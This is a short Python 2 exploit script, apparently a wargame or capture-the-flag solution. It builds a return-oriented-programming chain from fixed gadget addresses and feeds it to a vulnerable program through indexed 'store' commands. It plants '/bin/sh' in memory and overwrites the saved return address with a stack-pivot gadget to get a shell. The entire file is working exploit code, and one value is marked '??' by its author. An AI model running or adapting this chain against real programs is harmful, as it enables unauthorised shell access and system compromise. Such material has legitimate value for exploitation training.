#!/usr/bin/python2.7
import struct

payload = ""

JUNK = 0x00000000
PIVOT_ESP_44 = 0x08049bb7
POP_ECX_EBX = 0x0806f3d1
POP_EBX_EDI = 0x0806f3d1
INT_80 = 0x08048eaa
POP_EAX = 0x080bc4d6
POP_EDX = 0x80e6255
XOR_EAX = 0x08054c30
RET_4 = 0x0804854b

BUF_ADDR_PTR = 0xbffff518
BIN_SH_IDX = 61
BINSH_ADDR = BUF_ADDR_PTR + BIN_SH_IDX * 4

# Start from index 0 (Quend)
payload += str(JUNK)
# Index 1
payload += struct.pack('<L', POP_ECX_EBX)
# Index 2
payload += struct.pack('<L', BINSH_ADDR + 12)  # ??
# Index 3 (Quend)
payload += str(JUNK)
# Index 4
payload += struct.pack('<L', POP_EBX_EDI)
# Index 5
payload += struct.pack('<L', BINSH_ADDR)
# Index 6 (Quend)
payload += str(JUNK)
# Index 7
payload += struct.pack('<L', XOR_EAX)
# Index 8
payload += struct.pack('<L', POP_EDX)
# Index 9 (Quend)
payload += str(JUNK)
# Index 10
payload += struct.pack('<L', RET_4)
# Index 11
payload += struct.pack('<L', POP_EAX)
# Index 12 (Quend)
payload += str(JUNK)
# Index 13
payload += struct.pack('<L', 0xB)
# Index 14
payload += struct.pack('<L', INT_80)

idx = 0

# Write ROP chain to fragmented buffer 
for chunk in [payload[i: i + 4] for i in range(0, len(payload), 4)]:
    if idx % 3 == 0:
        if str(JUNK) in chunk:
            idx += 1
            continue
    else:
        print "store\n" + chunk + "\n" + str(idx) + "\n"
        idx += 1

print "store\n" + str(struct.unpack("<L", b"/bin")[0]) + "\n" + str(BIN_SH_IDX) + "\n"
print "store\n" + str(struct.unpack("<L", b"/sh\x00")[0]) + "\n" + str(BIN_SH_IDX + 1) + "\n"
# Write ptr to //bin//sh string
print "store\n" + str(BUF_ADDR_PTR + BIN_SH_IDX * 4) + "\n" + str(BIN_SH_IDX + 3) + "\n"
# Overwrite RA with pivot gadget
print "store\n" + str(PIVOT_ESP_44) + "\n" + str(-11) + "\n"
# End the party!
print "quit"
